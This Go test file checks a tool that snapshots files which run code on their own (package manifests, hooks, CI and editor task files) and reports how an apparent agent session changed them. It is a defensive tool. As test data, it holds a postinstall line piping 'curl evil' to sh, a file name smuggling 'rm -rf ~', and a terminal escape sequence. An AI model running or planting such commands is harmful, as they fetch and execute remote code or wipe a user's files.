package changereport

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
)

func write(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func snap(t *testing.T, root string) Files {
	t.Helper()
	s, err := Snapshot(root)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

// project has one file for each watched pattern plus unrelated files.
func project(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	for _, rel := range []string{
		"package.json", "Makefile", "flake.nix", "flake.lock", ".envrc",
		".github/workflows/ci.yml", ".vscode/tasks.json", ".husky/pre-commit",
		".githooks/pre-push", ".devcontainer/devcontainer.json",
		"web/package.json", "nix/shell.nix", "sub/.envrc",
		"main.go", "README.md", ".github/CODEOWNERS",
	} {
		write(t, root, rel, "original "+rel)
	}
	return root
}

func TestSnapshotRecordsOnlyWatched(t *testing.T) {
	root := project(t)
	write(t, root, "node_modules/left-pad/package.json", "{}")
	write(t, root, "build/Makefile", "all:")
	write(t, root, "docs/vscode/notes.md", "x")

	var got []string
	for p := range snap(t, root) {
		got = append(got, p)
	}
	slices.Sort(got)
	want := []string{
		".devcontainer/devcontainer.json", ".envrc", ".githooks/pre-push",
		".github/workflows/ci.yml", ".husky/pre-commit", ".vscode/tasks.json",
		"Makefile", "flake.lock", "flake.nix", "nix/shell.nix",
		"package.json", "sub/.envrc", "web/package.json",
	}
	if !slices.Equal(got, want) {
		t.Errorf("snapshot paths\n got %q\nwant %q", got, want)
	}
}

// TestSnapshotWith checks extra files are recorded anywhere, even in
// skipped directories, and that creating a missing one counts as added.
func TestSnapshotWith(t *testing.T) {
	root := project(t)
	write(t, root, "scripts/fsmonitor.sh", "original")
	write(t, root, "build/tools/crypt", "original")
	extra := []string{"scripts/fsmonitor.sh", "build/tools/crypt", "bin/fix"}
	before, err := SnapshotWith(root, extra)
	if err != nil {
		t.Fatal(err)
	}
	write(t, root, "scripts/fsmonitor.sh", "changed")
	write(t, root, "build/tools/crypt", "changed")
	write(t, root, "bin/fix", "new")
	write(t, root, "scripts/other.sh", "not watched")
	after, err := SnapshotWith(root, extra)
	if err != nil {
		t.Fatal(err)
	}
	want := []Change{{"bin/fix", Added}, {"build/tools/crypt", Modified}, {"scripts/fsmonitor.sh", Modified}}
	if got := Diff(before, after); !slices.Equal(got, want) {
		t.Errorf("changes = %v, want %v", got, want)
	}
}

func TestHostToolFilesModifiedAndDeleted(t *testing.T) {
	root := t.TempDir()
	for _, rel := range []string{"crates/core/build.rs", ".idea/runConfigurations/x.xml", ".cargo/config.toml", "Justfile"} {
		write(t, root, rel, "original")
	}
	before := snap(t, root)
	write(t, root, "crates/core/build.rs", "changed")
	write(t, root, ".idea/runConfigurations/x.xml", "changed")
	os.Remove(filepath.Join(root, ".cargo/config.toml"))
	os.Remove(filepath.Join(root, "Justfile"))
	want := []Change{
		{".cargo/config.toml", Deleted}, {".idea/runConfigurations/x.xml", Modified},
		{"Justfile", Deleted}, {"crates/core/build.rs", Modified},
	}
	if got := Diff(before, snap(t, root)); !slices.Equal(got, want) {
		t.Errorf("changes = %v, want %v", got, want)
	}
}

func TestDiff(t *testing.T) {
	cases := []struct {
		name   string
		change func(t *testing.T, root string)
		want   []Change
	}{
		{"no change", func(*testing.T, string) {}, nil},
		{"unrelated changes", func(t *testing.T, root string) {
			write(t, root, "main.go", "changed")
			write(t, root, "new.go", "added")
			write(t, root, ".github/CODEOWNERS", "changed")
			write(t, root, "node_modules/x/package.json", "added")
			os.Remove(filepath.Join(root, "README.md"))
		}, nil},
		{"modified", func(t *testing.T, root string) {
			write(t, root, "package.json", `{"scripts":{"postinstall":"curl evil | sh"}}`)
		}, []Change{{"package.json", Modified}}},
		{"modified in a watched directory", func(t *testing.T, root string) {
			write(t, root, ".github/workflows/ci.yml", "changed")
		}, []Change{{".github/workflows/ci.yml", Modified}}},
		{"added", func(t *testing.T, root string) {
			write(t, root, ".vscode/settings.json", "{}")
			write(t, root, "lib/default.nix", "{}")
			write(t, root, "deep/er/.envrc", "x")
		}, []Change{{".vscode/settings.json", Added}, {"deep/er/.envrc", Added}, {"lib/default.nix", Added}}},
		{"added host tool files", func(t *testing.T, root string) {
			for _, rel := range []string{
				"mise.toml", "web/.mise.toml", ".tool-versions", "sub/.gitattributes", ".gitmodules",
				"crates/core/build.rs", "crates/core/.cargo/config.toml", "justfile", "tools/Justfile",
				"Taskfile.yml", "svc/Taskfile.yaml", ".idea/workspace.xml", ".idea/runConfigurations/x.xml",
				"target/debug/build.rs", "src/build.rs.md",
			} {
				write(t, root, rel, "x")
			}
		}, []Change{
			{".gitmodules", Added}, {".idea/runConfigurations/x.xml", Added}, {".idea/workspace.xml", Added},
			{".tool-versions", Added}, {"Taskfile.yml", Added}, {"crates/core/.cargo/config.toml", Added},
			{"crates/core/build.rs", Added}, {"justfile", Added}, {"mise.toml", Added},
			{"sub/.gitattributes", Added}, {"svc/Taskfile.yaml", Added}, {"tools/Justfile", Added},
			{"web/.mise.toml", Added},
		}},
		{"deleted", func(t *testing.T, root string) {
			os.Remove(filepath.Join(root, "Makefile"))
			os.RemoveAll(filepath.Join(root, ".husky"))
		}, []Change{{".husky/pre-commit", Deleted}, {"Makefile", Deleted}}},
		{"permissions", func(t *testing.T, root string) {
			os.Chmod(filepath.Join(root, ".githooks/pre-push"), 0o755)
		}, []Change{{".githooks/pre-push", Modified}}},
		{"same size and mtime", func(t *testing.T, root string) {
			p := filepath.Join(root, "flake.lock")
			info, _ := os.Stat(p)
			write(t, root, "flake.lock", "ORIGINAL flake.lock")
			os.Chtimes(p, info.ModTime(), info.ModTime())
		}, []Change{{"flake.lock", Modified}}},
		{"watched directory replaced by a symlink", func(t *testing.T, root string) {
			write(t, root, "elsewhere/tasks.json", "x")
			os.RemoveAll(filepath.Join(root, ".vscode"))
			if err := os.Symlink("elsewhere", filepath.Join(root, ".vscode")); err != nil {
				t.Fatal(err)
			}
		}, []Change{{".vscode", Added}, {".vscode/tasks.json", Deleted}}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := project(t)
			before := snap(t, root)
			c.change(t, root)
			got := Diff(before, snap(t, root))
			if !slices.Equal(got, c.want) {
				t.Errorf("Diff\n got %v\nwant %v", got, c.want)
			}
		})
	}
}

func TestSymlinkTargetChange(t *testing.T) {
	root := t.TempDir()
	write(t, root, "a.mk", "a")
	write(t, root, "b.mk", "b")
	link := filepath.Join(root, "Makefile")
	if err := os.Symlink("a.mk", link); err != nil {
		t.Fatal(err)
	}
	before := snap(t, root)
	os.Remove(link)
	if err := os.Symlink("b.mk", link); err != nil {
		t.Fatal(err)
	}
	want := []Change{{"Makefile", Modified}}
	if got := Diff(before, snap(t, root)); !slices.Equal(got, want) {
		t.Errorf("Diff = %v, want %v", got, want)
	}
}

func TestWarnings(t *testing.T) {
	got := Warnings([]Change{{"Makefile", Deleted}, {"package.json", Modified}})
	want := []string{"deleted   Makefile", "modified  package.json"}
	if !slices.Equal(got, want) {
		t.Errorf("Warnings = %q, want %q", got, want)
	}
}

func TestReport(t *testing.T) {
	root := project(t)
	write(t, root, "package.json", `{"devDependencies":{"vitest":"^1.0.0"}}`)
	write(t, root, "go.mod", "module a\n\nrequire example.com/x v1.0.0\n")
	write(t, root, "web/package.json", `{"name":"web"}`)
	before := snap(t, root)
	write(t, root, "package.json", `{"devDependencies":{"vitest":"^1.0.0","wrangler":"^4.0.0"},"scripts":{"postinstall":"node x.js"}}`)
	write(t, root, "go.mod", "module a\n\nrequire example.com/x v1.2.0\n")
	write(t, root, "web/package.json", `{"name":"web",`)
	write(t, root, "sub/.envrc", "changed")
	write(t, root, ".vscode/my tasks.json", "{}")
	os.Remove(filepath.Join(root, "Makefile"))
	after := snap(t, root)

	got := Report("/home/u/my project", before, after, Diff(before, after))
	want := []string{
		"added     .vscode/my tasks.json",
		"    see: git -C '/home/u/my project' status -- '.vscode/my tasks.json'",
		"deleted   Makefile",
		"modified  go.mod",
		"    require: changed example.com/x: v1.0.0 -> v1.2.0",
		"modified  package.json",
		"    devDependencies: added wrangler ^4.0.0",
		`    scripts: added postinstall (runs on install) "node x.js"`,
		"modified  sub/.envrc",
		"    see: git -C '/home/u/my project' diff HEAD -- sub/.envrc",
		"modified  web/package.json",
		"    could not compare the dependencies: the file can't be parsed before or after the session",
		"    see: git -C '/home/u/my project' diff HEAD -- web/package.json",
	}
	if !slices.Equal(got, want) {
		t.Errorf("Report\n got %q\nwant %q", got, want)
	}
}

func TestReportUncomparableManifests(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"name":"a"}`)
	write(t, root, "big/package.json", `{}`)
	write(t, root, "link/real.json", `{}`)
	if err := os.Symlink("real.json", filepath.Join(root, "link/package.json")); err != nil {
		t.Fatal(err)
	}
	before := snap(t, root)
	write(t, root, "package.json", `{"name":"b"}`)
	write(t, root, "big/package.json", `{"x":"`+strings.Repeat("a", maxContent)+`"}`)
	os.Remove(filepath.Join(root, "link/package.json"))
	write(t, root, "link/package.json", `{}`)
	after := snap(t, root)

	got := strings.Join(Report("/p", before, after, Diff(before, after)), "\n")
	for _, want := range []string{
		"modified  big/package.json\n    could not compare the dependencies: not a regular file, or too large\n    see: git -C /p diff HEAD -- big/package.json",
		"modified  link/package.json\n    could not compare the dependencies: not a regular file, or too large",
		"modified  package.json\n    no dependency or script changes\n    see: git -C /p diff HEAD -- package.json",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("Report lacks\n%s\nin\n%s", want, got)
		}
	}
}

// TestReportControlCharacterPaths checks that a path the agent chose can't
// write control sequences to the terminal or into a command to copy.
func TestReportControlCharacterPaths(t *testing.T) {
	root := t.TempDir()
	before := snap(t, root)
	write(t, root, ".vscode/\x1b[2Jx.json", "{}")
	write(t, root, ".vscode/a'; rm -rf ~ '.json", "{}")
	got := strings.Join(Report("/p", before, snap(t, root), Diff(before, snap(t, root))), "\n")
	if strings.Contains(got, "\x1b") {
		t.Errorf("raw escape in report:\n%q", got)
	}
	for _, want := range []string{
		`added     ".vscode/\x1b[2Jx.json"`,
		"    see: git status (the path has control characters)",
		`    see: git -C /p status -- '.vscode/a'\''; rm -rf ~ '\''.json'`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("Report lacks %q in\n%s", want, got)
		}
	}
}

// TestSnapshotLargeProject checks that unwatched files aren't read: 20,000
// source files and a big node_modules should take well under a second.
func TestSnapshotLargeProject(t *testing.T) {
	if testing.Short() {
		t.Skip("short")
	}
	root := project(t)
	for i := range 200 {
		for j := range 100 {
			write(t, root, "src/d"+strconv.Itoa(i)+"/f"+strconv.Itoa(j)+".go", "package x")
		}
		write(t, root, "node_modules/p"+strconv.Itoa(i)+"/package.json", "{}")
	}
	start := time.Now()
	s := snap(t, root)
	if d := time.Since(start); d > 2*time.Second {
		t.Errorf("snapshot took %s", d)
	}
	if len(s) != 13 {
		t.Errorf("snapshot has %d files, want 13", len(s))
	}
}
